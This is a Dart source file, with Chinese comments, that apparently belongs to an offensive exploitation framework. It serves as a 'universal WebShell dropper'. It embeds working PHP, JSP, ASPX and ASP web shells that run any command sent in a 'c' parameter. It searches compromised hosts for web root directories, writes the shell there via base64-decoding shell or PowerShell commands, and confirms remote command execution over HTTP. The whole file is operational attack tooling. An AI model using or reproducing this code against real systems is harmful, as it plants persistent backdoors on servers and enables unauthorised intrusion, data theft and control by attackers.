/// 通用 WebShell 落盘器。
///
/// 任何具备命令执行能力的模块，都可以用"写文件 + HTTP 回显校验"拿到一个可用的
/// WebShell——这就是 Shiro 内存马之外、覆盖面最广的通用方案。
library;

import 'dart:convert';
import 'dart:math';

import 'package:http/http.dart' as http;

import 'exploit_module.dart';

enum ShellKind {
  php('php'),
  jsp('jsp'),
  aspx('aspx'),
  asp('asp');

  const ShellKind(this.extension);
  final String extension;
}

/// 落盘候选目录：目录 + 该目录对应的 URL 前缀。
class _DirCandidate {
  const _DirCandidate(this.path, this.urlPrefix);
  final String path;
  final String urlPrefix;
}

class ShellDeployer {
  ShellDeployer._();

  static final _rng = Random.secure();

  static String _token(String prefix) =>
      '$prefix${_rng.nextInt(0x7fffffff).toRadixString(16)}';

  static List<int> _body(ShellKind kind) {
    const php = "<?php @system(\$_REQUEST['c']); ?>";
    const jsp =
        '<%@ page import="java.io.*" %><%'
        'Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("c")});'
        'BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));'
        'String l; while((l=r.readLine())!=null){ out.println(l); } %>';
    const aspx =
        '<%@ Page Language="C#" %><%'
        'var p=System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"])'
        '{RedirectStandardOutput=true,UseShellExecute=false});'
        'Response.Write(p.StandardOutput.ReadToEnd()); %>';
    const asp =
        '<% Set s=Server.CreateObject("WScript.Shell") '
        'Set e=s.Exec(Request("c")) '
        'Response.Write e.StdOut.ReadAll %>';
    final text = switch (kind) {
      ShellKind.php => php,
      ShellKind.jsp => jsp,
      ShellKind.aspx => aspx,
      ShellKind.asp => asp,
    };
    return utf8.encode(text);
  }

  /// 在目标上写入一个 WebShell 并验证可执行。
  ///
  /// [exec] 是模块提供的命令执行函数；[serverHint] 可传 `jsp`/`php` 提示
  /// （只影响候选目录顺序，不影响实际探测）。
  static Future<ShellSession?> deploy({
    required String targetUrl,
    required Future<String?> Function(String cmd) exec,
    required ShellKind kind,
    String? preferredDirectory,
    String? serverHint,
    bool blind = false,
    Duration timeout = const Duration(seconds: 10),
  }) async {
    final name = _token('mx_');
    final marker = _token('MXSHELL_');
    final bytes = _body(kind);
    final b64 = base64.encode(bytes);
    final fileName = '$name.${kind.extension}';

    final origin = _origin(targetUrl);
    final candidates = <_DirCandidate>[
      if (preferredDirectory != null && preferredDirectory.isNotEmpty)
        _DirCandidate(preferredDirectory, '/'),
      ...await _discoverDirectories(exec, kind, serverHint),
    ];

    for (final dir in candidates) {
      final path = '${dir.path}/$fileName';
      if (blind) {
        await _writeUnix(exec, path, b64); // 盲打：写不写成功只能靠 HTTP 验证
      } else if (!await _writeUnix(exec, path, b64)) {
        continue;
      }
      final session = await _verify(
        origin: origin,
        urlPath: '${dir.urlPrefix}$fileName',
        marker: marker,
        kind: kind,
        timeout: timeout,
      );
      if (session != null) {
        return ShellSession(
          url: session.url,
          password: 'c',
          kind: kind.name,
          note: '写入 $path',
        );
      }
    }

    // Windows 目标回退
    for (final dir in _windowsCandidates()) {
      final path = '${dir.path}\\$fileName';
      final written = await _writeWindows(exec, path, b64);
      if (!written) continue;
      final session = await _verify(
        origin: origin,
        urlPath: '${dir.urlPrefix}$fileName',
        marker: marker,
        kind: kind,
        timeout: timeout,
      );
      if (session != null) {
        return ShellSession(
          url: session.url,
          password: 'c',
          kind: kind.name,
          note: '写入 $path',
        );
      }
    }
    return null;
  }

  static String _origin(String targetUrl) {
    final u = Uri.tryParse(targetUrl);
    if (u == null || u.host.isEmpty) {
      return targetUrl.endsWith('/')
          ? targetUrl.substring(0, targetUrl.length - 1)
          : targetUrl;
    }
    final port = u.hasPort ? ':${u.port}' : '';
    return '${u.scheme}://${u.host}$port';
  }

  static Future<List<_DirCandidate>> _discoverDirectories(
    Future<String?> Function(String) exec,
    ShellKind kind,
    String? hint,
  ) async {
    final dirs = <_DirCandidate>[];
    final cwd = (await exec('pwd'))?.trim();
    if (cwd != null && cwd.startsWith('/') && !cwd.startsWith('[')) {
      dirs.add(_DirCandidate(cwd, '/'));
    }
    // 目标容器各异（Tomcat / Jetty / PHP-FPM），用 find 探测真实 web 根，
    // 比写死路径可靠得多（实测 S2-045 靶场是 Jetty 的 src/main/webapp）。
    final probe = await exec(
      "find / -maxdepth 5 -type d \\( -name webapp -o -name webapps -o -name ROOT "
      "-o -name htdocs -o -name www -o -name public_html \\) 2>/dev/null | head -8",
    );
    for (final line in (probe ?? '').split('\n')) {
      final dir = line.trim();
      if (dir.startsWith('/') && !dir.contains(' ')) {
        dirs.add(_DirCandidate(dir, '/'));
      }
    }

    final javaStyle = kind == ShellKind.jsp || (hint ?? '').contains('jsp');
    final phpStyle = kind == ShellKind.php || (hint ?? '').contains('php');
    if (javaStyle) {
      dirs.addAll(const [
        _DirCandidate('/usr/local/tomcat/webapps/ROOT', '/'),
        _DirCandidate('/opt/tomcat/webapps/ROOT', '/'),
        _DirCandidate('/var/lib/tomcat9/webapps/ROOT', '/'),
        _DirCandidate('/usr/local/tomcat/webapps', '/'),
      ]);
    } else if (phpStyle) {
      dirs.addAll(const [
        _DirCandidate('/var/www/html', '/'),
        _DirCandidate('/var/www', '/'),
        _DirCandidate('/app', '/'),
      ]);
    } else {
      dirs.addAll(const [
        _DirCandidate('/var/www/html', '/'),
        _DirCandidate('/usr/local/tomcat/webapps/ROOT', '/'),
      ]);
    }
    // 去重
    final seen = <String>{};
    return [
      for (final d in dirs)
        if (seen.add(d.path)) d,
    ];
  }

  static List<_DirCandidate> _windowsCandidates() => const [
    _DirCandidate(r'C:\inetpub\wwwroot', '/'),
    _DirCandidate(r'C:\xampp\htdocs', '/'),
    _DirCandidate(r'C:\tomcat\webapps\ROOT', '/'),
    _DirCandidate(r'C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT', '/'),
  ];

  static Future<bool> _writeUnix(
    Future<String?> Function(String) exec,
    String path,
    String b64,
  ) async {
    final quoted = "'${path.replaceAll("'", "'\\''")}'";
    final out = await exec(
      "printf %s $b64 | base64 -d > $quoted && echo MX_WRITE_OK",
    );
    return (out ?? '').contains('MX_WRITE_OK');
  }

  static Future<bool> _writeWindows(
    Future<String?> Function(String) exec,
    String path,
    String b64,
  ) async {
    final cmd =
        "powershell -NoP -NonI -Command \"[IO.File]::WriteAllBytes('$path',"
        "[Convert]::FromBase64String('$b64')) ; echo MX_WRITE_OK\"";
    final out = await exec(cmd);
    return (out ?? '').contains('MX_WRITE_OK');
  }

  static Future<ShellSession?> _verify({
    required String origin,
    required String urlPath,
    required String marker,
    required ShellKind kind,
    required Duration timeout,
  }) async {
    final url = '$origin$urlPath';
    try {
      final sep = url.contains('?') ? '&' : '?';
      final probe = Uri.parse(
        '$url${sep}c=${Uri.encodeQueryComponent('echo $marker')}',
      );
      final res = await http.get(probe).timeout(timeout);
      if (res.statusCode == 200 && res.body.contains(marker)) {
        return ShellSession(url: url, password: 'c', kind: kind.name);
      }
    } catch (_) {}
    return null;
  }
}
